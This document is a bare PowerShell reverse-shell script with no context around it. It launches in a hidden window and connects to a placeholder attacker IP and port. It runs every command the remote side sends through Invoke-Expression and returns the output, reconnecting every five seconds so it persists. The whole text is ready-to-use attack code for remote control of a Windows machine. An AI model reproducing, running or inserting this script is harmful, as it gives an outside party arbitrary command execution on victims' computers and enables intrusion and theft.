powershell -Window Hidden -Command "while ($true) {
    try {
        $TCPClient = $null
        $NetworkStream = $null
        $StreamWriter = $null

        while ($null -eq $TCPClient) {
            try {
                $TCPClient = New-Object Net.Sockets.TCPClient('<IP>', <PORT>)
                $NetworkStream = $TCPClient.GetStream()
                $StreamWriter = New-Object IO.StreamWriter($NetworkStream)

                function WriteToStream ($String) {
                    [byte[]]$script:Buffer = 0..($TCPClient.ReceiveBufferSize - 1) | % { 0 }
                    $StreamWriter.Write($String + 'SHELL> ')
                    $StreamWriter.Flush()
                }

                WriteToStream ''

                while ($NetworkStream.CanRead) {
                    $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
                    if ($BytesRead -eq 0) { break }

                    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead)
                    $Output = try {
                        Invoke-Expression $Command 2>&1 | Out-String
                    } catch {
                        $ErrorMessage = $_.Exception.Message
                        WriteToStream "Error: $ErrorMessage"
                        continue
                    }

                    WriteToStream $Output
                }
            } catch {
                $ErrorMessage = $_.Exception.Message
                Write-Host "Connection failed. Retrying in 5 seconds..."
                Start-Sleep -Seconds 5
                $TCPClient = $null
                continue
            } finally {
                # Close the StreamWriter and TCPClient objects if they are open
                if ($StreamWriter) { $StreamWriter.Close() }
                if ($TCPClient) { $TCPClient.Close() }
            }
        }
    } catch {
        # Handle any global exceptions here
        Write-Host "An unexpected error occurred: $_"
    }
}"
